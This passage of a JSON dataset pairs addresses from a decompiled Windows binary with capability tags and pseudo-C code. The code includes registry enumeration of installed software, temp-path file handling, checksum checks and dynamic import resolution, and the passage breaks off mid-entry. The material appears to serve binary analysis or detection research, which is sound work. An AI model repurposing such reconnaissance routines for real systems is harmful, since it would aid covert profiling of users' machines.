{
    "00401026": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040103b)\n\nvoid __cdecl fcn.00401026(uint arg_8h)\n\n{\n    return;\n}\n",
        "token_count": 37
    },
    "004011aa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004011c3)\n// WARNING: Removing unreachable block (ram,0x004011d0)\n// WARNING: Removing unreachable block (ram,0x004011d7)\n// WARNING: Removing unreachable block (ram,0x004011dd)\n// WARNING: Removing unreachable block (ram,0x004011e7)\n// WARNING: Removing unreachable block (ram,0x004011ea)\n// WARNING: Removing unreachable block (ram,0x00401208)\n// WARNING: Removing unreachable block (ram,0x0040120f)\n// WARNING: Removing unreachable block (ram,0x00401215)\n// WARNING: Removing unreachable block (ram,0x0040121c)\n// WARNING: Removing unreachable block (ram,0x00401226)\n\nulong __cdecl fcn.004011aa(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint in_EAX;\n    uint in_EDX;\n    uint var_4h;\n    \n    return CONCAT44(in_EAX, in_EDX);\n}\n",
        "token_count": 231
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "0040137a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040137a(uint arg_8h, uint arg_ch, uint arg_10h, uint32_t *arg_14h)\n\n{\n    uint32_t uVar1;\n    \n    if (*arg_14h == 0) {\n        return;\n    }\n    uVar1 = fcn.0040114c(arg_8h, arg_ch, arg_10h);\n    *arg_14h = *arg_14h & uVar1;\n    return;\n}\n",
        "token_count": 109
    },
    "004013a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004013a0(uint arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t var_4h;\n    \n    fcn.0040137a(arg_8h, &var_4h, 4, arg_ch);\n    if (*arg_ch == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = var_4h >> 0x18 | (var_4h & 0xff0000) >> 8 | (var_4h & 0xff00) << 8 | var_4h << 0x18;\n    }\n    return uVar1;\n}\n",
        "token_count": 158
    },
    "004013cc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.004013cc(uint arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint var_2h;\n    \n    fcn.0040137a(arg_8h, &var_2h, 2, arg_ch);\n    if (*arg_ch == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = var_2h << 8 | var_2h >> 8;\n    }\n    return uVar1;\n}\n",
        "token_count": 146
    },
    "004013f9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.004013f9(uint arg_8h, int32_t *arg_ch)\n\n{\n    uint var_1h;\n    \n    fcn.0040137a(arg_8h, &var_1h, 1, arg_ch);\n    if (*arg_ch == 0) {\n        var_1h._0_1_ = 0;\n    }\n    return var_1h;\n}\n",
        "token_count": 118
    },
    "00401424": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401424(uint arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    \n    if (*arg_10h == 0) {\n        return;\n    }\n    iVar1 = fcn.004010d6(arg_8h, arg_ch);\n    if (iVar1 == 0) {\n        *arg_10h = 0;\n    }\n    else {\n        fcn.00401051(arg_8h, arg_ch, 1);\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "0040145e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040145e(uint hFile, uint arg_ch, int32_t nNumberOfBytesToWrite)\n\n{\n    int32_t iVar1;\n    int32_t lpNumberOfBytesWritten;\n    \n    while( true ) {\n        iVar1 = sub.kernel32.dll_WriteFile();\n        if ((iVar1 == 0) || (lpNumberOfBytesWritten == 0)) break;\n        nNumberOfBytesToWrite = nNumberOfBytesToWrite - lpNumberOfBytesWritten;\n        if (nNumberOfBytesToWrite == 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 130
    },
    "00401537": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401537(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    if ((arg_ch != 0) && (arg_10h != 0)) {\n        fcn.004011aa(arg_8h, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 77
    },
    "00401558": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401558(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    fcn.00401522(arg_8h, arg_10h);\n    if ((arg_10h != 0) && (arg_ch != 0)) {\n        fcn.00401537(arg_8h, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 94
    },
    "00401584": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401584(uint arg_8h, int32_t lpString)\n\n{\n    uint arg_10h;\n    \n    if (lpString == 0) {\n        arg_10h = 0;\n    }\n    else {\n        arg_10h = sub.kernel32.dll_lstrlenA(lpString);\n    }\n    fcn.00401558(arg_8h, lpString, arg_10h);\n    return;\n}\n",
        "token_count": 97
    },
    "00401694": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401694(uint pstm)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint phglobal;\n    \n    var_ch = 0;\n    iVar1 = sub.ole32.dll_GetHGlobalFromStream(pstm, &phglobal);\n    if (iVar1 < 0) {\n        return false;\n    }\n    var_8h = fcn.00401091(pstm);\n    if (3 < var_8h) {\n        var_8h = var_8h - 4;\n        iVar1 = sub.kernel32.dll_GlobalLock(phglobal);\n        if (iVar1 != 0) {\n            uVar2 = fcn.00401bd7(0, iVar1, var_8h);\n            var_ch = ~(uVar2 >> 0x18 | (uVar2 & 0xff0000) >> 8 | (uVar2 & 0xff00) << 8 | uVar2 << 0x18);\n            sub.kernel32.dll_GlobalUnlock(phglobal);\n        }\n        fcn.00401051(pstm, 0xfffffffc, 2);\n        var_10h = 1;\n        uVar2 = fcn.004013a0(pstm, &var_10h);\n        if (var_10h == 0) {\n            bVar3 = false;\n        }\n        else {\n            bVar3 = (uVar2 >> 0x18 | (uVar2 & 0xff0000) >> 8 | (uVar2 & 0xff00) << 8 | uVar2 << 0x18) == var_ch;\n        }\n        return bVar3;\n    }\n    fcn.004012c2(pstm);\n    return false;\n}\n",
        "token_count": 416
    },
    "0040178e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040178e(int32_t hMem)\n\n{\n    if (hMem != 0) {\n        sub.kernel32.dll_LocalFree(hMem);\n    }\n    return 0;\n}\n",
        "token_count": 46
    },
    "00401a9e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401a9e(uint hKey, uint lpSubKey, uint lpValueName, int32_t *arg_14h, uint32_t arg_18h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t hMem;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (arg_14h != NULL) {\n        *arg_14h = 0;\n    }\n    hMem = 0;\n    if (arg_18h == 1) {\n        uVar2 = 0x200;\n    }\n    else if (arg_18h == 2) {\n        uVar2 = 0x100;\n    }\n    else {\n        uVar2 = 0;\n    }\n    iVar1 = sub.advapi32.dll_RegOpenKeyExA(hKey, lpSubKey, 0, uVar2 | 0x20019, &var_4h);\n    if (iVar1 == 0) {\n        iVar1 = sub.advapi32.dll_RegQueryValueExA(var_4h, lpValueName, 0, &var_ch, 0, &var_8h);\n        if (((iVar1 == 0) && (var_8h != 0)) && ((var_ch != 1 || (var_8h != 1)))) {\n            hMem = fcn.004017a5(var_8h + 1);\n            iVar1 = sub.advapi32.dll_RegQueryValueExA(var_4h, lpValueName, 0, 0, hMem, &var_8h);\n            if (iVar1 == 0) {\n                if (arg_14h != NULL) {\n                    *arg_14h = var_8h;\n                }\n            }\n            else {\n                fcn.0040178e(hMem);\n                hMem = 0;\n            }\n        }\n        sub.advapi32.dll_RegCloseKey(var_4h);\n    }\n    if ((hMem == 0) && (arg_18h < 2)) {\n        fcn.00401a9e(hKey, lpSubKey, lpValueName, arg_14h, arg_18h + 1);\n    }\n    return;\n}\n",
        "token_count": 502
    },
    "00401c09": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401c09(int32_t lpString2, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if (lpString2 == 0) {\n        lpString2 = 0x4120b3;\n    }\n    if (arg_ch == 0) {\n        arg_ch = 0x4120b3;\n    }\n    iVar1 = sub.kernel32.dll_lstrlenA(lpString2);\n    iVar2 = sub.kernel32.dll_lstrlenA(arg_ch);\n    uVar3 = fcn.004017a5(iVar1 + iVar2 + 1);\n    sub.kernel32.dll_lstrcpyA(uVar3, lpString2);\n    sub.kernel32.dll_lstrcatA(uVar3, arg_ch);\n    return uVar3;\n}\n",
        "token_count": 186
    },
    "00401c5d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401c5d(int32_t lpString2, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if (lpString2 == 0) {\n        lpString2 = 0x4120b3;\n    }\n    if (arg_ch == 0) {\n        arg_ch = 0x4120b3;\n    }\n    iVar1 = sub.kernel32.dll_lstrlenA(lpString2);\n    iVar2 = sub.kernel32.dll_lstrlenA(arg_ch);\n    uVar3 = fcn.004017a5(iVar1 + iVar2 + 1);\n    sub.kernel32.dll_lstrcpyA(uVar3, lpString2);\n    sub.kernel32.dll_lstrcatA(uVar3, arg_ch);\n    if (lpString2 != 0x4120b3) {\n        fcn.0040178e(lpString2);\n    }\n    return uVar3;\n}\n",
        "token_count": 217
    },
    "00401cc2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401cc2(uint32_t arg_8h)\n\n{\n    uint *puVar1;\n    int32_t hMem;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t var_4h;\n    \n    hMem = fcn.004017a5(0x105);\n    if ((*0x412446 == NULL) || (iVar2 = (**0x412446)(0, arg_8h, 0, 0, hMem),  iVar2 < 0)) {\n        fcn.0040178e(hMem);\n        var_4h = 0;\n        piVar3 = 0x41244a;\n        while ((hMem = var_4h,  *piVar3 != 0 &&\n               ((puVar1 = *piVar3,  puVar1[1] != (arg_8h & 0xffff7fff) ||\n                (hMem = fcn.00401b82(*puVar1, \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Shell Folders\", \n                                     puVar1 + 2, 0),  hMem == 0))))) {\n            piVar3 = piVar3 + 1;\n        }\n    }\n    var_4h = hMem;\n    return var_4h;\n}\n",
        "token_count": 294
    },
    "00401d47": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401d47(char *lpFileName)\n\n{\n    int32_t iVar1;\n    \n    if ((lpFileName != NULL) && (*lpFileName != '\\0')) {\n        iVar1 = sub.kernel32.dll_CreateFileA(lpFileName, 0x80, 0, 0, 3, 0, 0);\n        if (iVar1 != -1) {\n            sub.kernel32.dll_CloseHandle(iVar1);\n        }\n        return iVar1 != -1;\n    }\n    return false;\n}\n",
        "token_count": 114
    },
    "00401d90": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401d90(char *lpFileName)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    \n    if ((lpFileName != NULL) && (*lpFileName != '\\0')) {\n        uVar1 = sub.kernel32.dll_GetFileAttributesA(lpFileName);\n        if (uVar1 == 0xffffffff) {\n            bVar2 = false;\n        }\n        else {\n            bVar2 = (uVar1 & 0x10) != 0;\n        }\n        return bVar2;\n    }\n    return false;\n}\n",
        "token_count": 123
    },
    "00401ecc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00401ecc(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint arg_10h;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint hMem;\n    uint arg_ch;\n    uint var_1020h;\n    uint phglobal;\n    uint32_t var_1018h;\n    uint var_1014h;\n    uint pstm;\n    int32_t dwIndex;\n    uint var_1008h;\n    uint lpString;\n    uint hKey;\n    \n    if (*0x412059 != NULL) {\n        fcn.0040178e(*0x412059);\n        *0x412059 = NULL;\n    }\n    if (*0x41205d != NULL) {\n        fcn.0040178e(*0x41205d);\n        *0x41205d = NULL;\n    }\n    fcn.00401000(&pstm);\n    fcn.00401000(&var_1014h);\n    iVar1 = sub.advapi32.dll_RegOpenKeyA(0x80000002, \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\", &hKey);\n    if (iVar1 == 0) {\n        dwIndex = 0;\n        while( true ) {\n            var_1008h = 0xfff;\n            iVar1 = sub.advapi32.dll_RegEnumKeyExA(hKey, dwIndex, &lpString, &var_1008h, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            iVar1 = fcn.00401c09(\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\", 0x4120b1);\n            if ((iVar1 != 0) && (iVar1 = fcn.00401c5d(iVar1, &lpString),  iVar1 != 0)) {\n                uVar2 = fcn.00401b82(0x80000002, iVar1, \"UninstallString\", &var_1018h);\n                if ((uVar2 != 0) && (1 < uVar2)) {\n                    fcn.00401537(pstm, uVar2, var_1018h);\n                    iVar3 = fcn.00401b82(0x80000002, iVar1, \"DisplayName\", &var_1018h);\n                    if ((iVar3 == 0) || (var_1018h < 2)) {\n                        iVar3 = sub.kernel32.dll_lstrlenA(&lpString);\n                        arg_10h = var_1014h;\n                        fcn.00401537(var_1014h, &lpString, iVar3 + 1);\n                    }\n                    else {\n                        arg_10h = sub.kernel32.dll_lstrlenA(&lpString, iVar3, iVar3);\n                        arg_ch = var_1014h;\n                        fcn.00401537(var_1014h, &lpString, arg_10h);\n                        hMem = var_1014h;\n                        fcn.00401537(var_1014h, arg_ch, var_1018h);\n                        fcn.0040178e(hMem);\n                    }\n                    fcn.0040178e(arg_10h);\n                }\n                fcn.0040178e(iVar1);\n            }\n            dwIndex = dwIndex + 1;\n        }\n        sub.advapi32.dll_RegCloseKey();\n    }\n    fcn.00401522(pstm, 0);\n    fcn.00401522(var_1014h, 0);\n    iVar1 = sub.ole32.dll_GetHGlobalFromStream(pstm, &phglobal);\n    if (-1 < iVar1) {\n        var_1018h = fcn.00401091(pstm);\n        *0x412059 = fcn.004017a5(var_1018h);\n        puVar4 = sub.kernel32.dll_GlobalLock(phglobal);\n        uVar2 = var_1018h;\n        puVar5 = *0x412059;\n        if (puVar4 != NULL) {\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar5 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar5 = puVar5 + 1;\n            }\n            sub.kernel32.dll_GlobalUnlock(phglobal);\n        }\n    }\n    iVar1 = sub.ole32.dll_GetHGlobalFromStream(var_1014h, &phglobal);\n    if (-1 < iVar1) {\n        var_1018h = fcn.00401091(var_1014h);\n        *0x41205d = fcn.004017a5(var_1018h);\n        puVar4 = sub.kernel32.dll_GlobalLock(phglobal);\n        uVar2 = var_1018h;\n        puVar5 = *0x41205d;\n        if (puVar4 != NULL) {\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar5 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar5 = puVar5 + 1;\n            }\n            sub.kernel32.dll_GlobalUnlock(phglobal);\n        }\n    }\n    fcn.00401026(pstm);\n    fcn.00401026(var_1014h);\n    return;\n}\n",
        "token_count": 1188
    },
    "004021bb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004021bb(int32_t arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    if (arg_8h == 0) {\n        var_4h = 0;\n        puVar1 = *0x4120b7;\n    }\n    else {\n        var_4h = fcn.00401bd7(0, arg_8h, arg_ch);\n        puVar1 = *0x4120b7;\n    }\n    do {\n        if (puVar1 == NULL) {\ncode_r0x00402207:\n            if (var_8h == 0) {\n                fcn.00402197(var_4h);\n            }\n            return var_8h;\n        }\n        if (var_4h == puVar1[1]) {\n            var_8h = 1;\n            goto code_r0x00402207;\n        }\n        puVar1 = *puVar1;\n    } while( true );\n}\n",
        "token_count": 247
    },
    "0040223e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.0040223e(uint lpString)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    char *pcVar6;\n    \n    pcVar2 = fcn.00401c09(lpString, 0);\n    uVar3 = sub.kernel32.dll_lstrlenA(lpString);\n    if ((1 < uVar3) && (pcVar6 = pcVar2,  pcVar1 = pcVar2,  *pcVar2 == '\\\"')) {\n        for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *pcVar6 = pcVar1[1];\n            pcVar6 = pcVar6 + 1;\n            pcVar1 = pcVar1 + 1;\n        }\n    }\n    iVar4 = sub.shlwapi.dll_StrStrIA(pcVar2, \".exe\");\n    if (iVar4 != 0) {\n        *(iVar4 + 4) = 0;\n    }\n    puVar5 = sub.shlwapi.dll_StrRChrIA(pcVar2, 0, 0x5c);\n    if (puVar5 == NULL) {\n        *pcVar2 = '\\0';\n    }\n    else {\n        *puVar5 = 0;\n    }\n    uVar3 = sub.kernel32.dll_lstrlenA(pcVar2);\n    if (uVar3 < 4) {\n        *pcVar2 = '\\0';\n    }\n    return pcVar2;\n}\n",
        "token_count": 343
    },
    "004022e9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004022e9(char *lpLibFileName, int32_t *arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    \n    iVar2 = sub.kernel32.dll_LoadLibraryA(lpLibFileName);\n    if (iVar2 == 0) {\n        return iVar2;\n    }\n    do {\n        iVar2 = -1;\n        pcVar3 = lpLibFileName;\n        do {\n            lpLibFileName = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            lpLibFileName = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = lpLibFileName;\n        } while (cVar1 != '\\0');\n        if (*lpLibFileName == '\\0') {\n            return 1;\n        }\n        iVar2 = sub.kernel32.dll_GetProcAddress();\n        if (iVar2 == 0) {\n            return iVar2;\n        }\n        *arg_ch = iVar2;\n        arg_ch = arg_ch + 1;\n    } while( true );\n}\n",
        "token_count": 245
    },
    "004023cb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004023cb(char *arg_8h)\n\n{\n    uint uVar1;\n    \n    if ((arg_8h != NULL) && (*arg_8h != '\\0')) {\n        uVar1 = 0;\n        for (; *arg_8h != '\\0'; arg_8h = arg_8h + 1) {\n            if ((*arg_8h == '\\\\') || (*arg_8h == '/')) {\n                uVar1 = 1;\n            }\n            else {\n                uVar1 = 0;\n            }\n        }\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 139
    },
    "00402619": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402619(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t arg_ch_00;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint in_stack_fffffe8c;\n    uint lpBuffer;\n    uint phglobal;\n    int32_t var_8h;\n    uint pstm;\n    \n    arg_ch_00 = fcn.00401b82(*0x4120d5, \"Software\\\\WinRAR\", arg_8h, arg_ch);\n    if (arg_ch_00 == 0) {\n        arg_ch_00 = 0;\n        uVar1 = sub.kernel32.dll_GetTempPathA(0x104, &lpBuffer);\n        if ((uVar1 != 0) && (uVar1 < 0x105)) {\n            fcn.00401000(&pstm);\n            iVar2 = fcn.004023cb(&lpBuffer);\n            if (iVar2 == 0) {\n                uVar3 = fcn.00401c09(&lpBuffer, 0x4120b1);\n                uVar3 = fcn.00401c5d(uVar3, arg_8h);\n            }\n            else {\n                uVar3 = fcn.00401c09(&lpBuffer, arg_8h);\n            }\n            iVar2 = fcn.00401230(uVar3, pstm, uVar3);\n            if ((((iVar2 != 0) && (var_8h = fcn.00401091(pstm),  var_8h != 0)) &&\n                (iVar2 = sub.ole32.dll_GetHGlobalFromStream(pstm, &phglobal),  -1 < iVar2)) &&\n               (iVar2 = sub.kernel32.dll_GlobalLock(phglobal),  iVar2 != 0)) {\n                iVar2 = var_8h;\n                arg_ch_00 = fcn.004017a5(var_8h);\n                fcn.004017dc(iVar2, arg_ch_00, var_8h);\n                sub.kernel32.dll_GlobalUnlock();\n                *arg_ch = var_8h;\n                in_stack_fffffe8c = phglobal;\n            }\n            fcn.0040178e(in_stack_fffffe8c);\n            fcn.00401026(pstm);\n        }\n    }\n    return arg_ch_00;\n}\n",
        "token_count": 526
    },
    "00402720": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402720(char *lpString)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    \n    while ((((pcVar2 = lpString,  *lpString == ' ' || (*lpString == '\\r')) || (*lpString == '\\n')) ||\n           (*lpString == '\\t'))) {\n        for (; *pcVar2 != '\\0'; pcVar2 = pcVar2 + 1) {\n            *pcVar2 = pcVar2[1];\n        }\n    }\n    while ((iVar1 = sub.kernel32.dll_lstrlenA(),  iVar1 != 0 &&\n           (((lpString[iVar1 + -1] == ' ' || (lpString[iVar1 + -1] == '\\r')) ||\n            ((lpString[iVar1 + -1] == '\\n' || (lpString[iVar1 + -1] == '\\t'))))))) {\n        lpString[iVar1 + -1] = '\\0';\n    }\n    return;\n}\n",
        "token_count": 212
    },
    "0040278a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
